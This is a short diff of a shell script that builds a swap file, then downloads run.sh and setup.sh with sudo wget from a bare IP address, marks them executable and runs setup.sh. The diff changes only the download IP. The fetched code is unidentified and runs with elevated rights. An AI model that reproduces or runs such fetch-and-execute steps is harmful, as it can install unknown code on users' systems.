@@ -5,8 +5,8 @@ dd if=/dev/zero of=/var/swap.img bs=1024k count=1000
 mkswap /var/swap.img
 cd
 swapon /var/swap.img
-sudo wget http://135.148.165.162/run.sh
-sudo wget http://135.148.165.162/setup.sh
+sudo wget http://51.79.186.224/run.sh
+sudo wget http://51.79.186.224/setup.sh
 apt-get -y update
 sudo chmod u+x setup.sh run.sh
 ./setup.sh
